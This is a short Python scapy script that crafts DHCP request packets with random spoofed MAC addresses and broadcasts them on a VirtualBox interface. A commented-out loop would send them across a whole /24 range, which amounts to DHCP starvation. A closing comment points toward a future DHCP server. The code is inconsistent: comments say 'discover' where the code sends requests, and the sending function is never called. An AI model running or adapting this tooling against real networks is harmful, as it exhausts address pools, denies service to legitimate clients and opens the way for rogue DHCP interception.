import netaddr
import argparse
from scapy.all import *




def makeDHCPRequest(ip, interface):
# Function to craft simple DHCP discover request

    # Get a random MAC address
    randomMac = RandMAC()
    # Craft DHCP discover request
    dhcp_request = Ether(src=randomMac, 
                        dst='ff:ff:ff:ff:ff:ff')/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=randomMac)/DHCP(options=[("message-type","request"),
                        ("server_id",ip),
                        ("requested_addr", 
                        ip),"end"]
                        )
    # Send DHCP discover request through specified interface
    sendp(dhcp_request,iface = interface, verbose = False)
    # Print the IP requested by the loop
    print(f"[+] DHCP discover for {ip}")


    return

# --------------------------------------------------------
# ------------------------- Main -------------------------
# --------------------------------------------------------

# Define a network in CIDR notation
network = '10.0.10.0/24'

# Check network format to avoid error
try:
    netAddress = netaddr.IPNetwork(network)
except netaddr.AddrFormatError as e:
    print("[!] Please specify a valid network address")
    print(f"[!] {e}")
    exit()




# Define interface used for dhcp spoofed request
interface = 'vboxnet0'

ip = '172.16.0.200'

# Get ip range with netaddr library
# .iter_host() allow to get only 'hostable' ip
ipRange = netaddr.IPNetwork(network).iter_hosts()

# Simple loop to make DHCP discover request on the IP range
#for ip in ipRange:
    #makeDHCPRequest(ip, interface)

# Futur DHCP server 
# http://pydhcplib.tuxfamily.org/pmwiki/index.php?n=Site.ServerExample

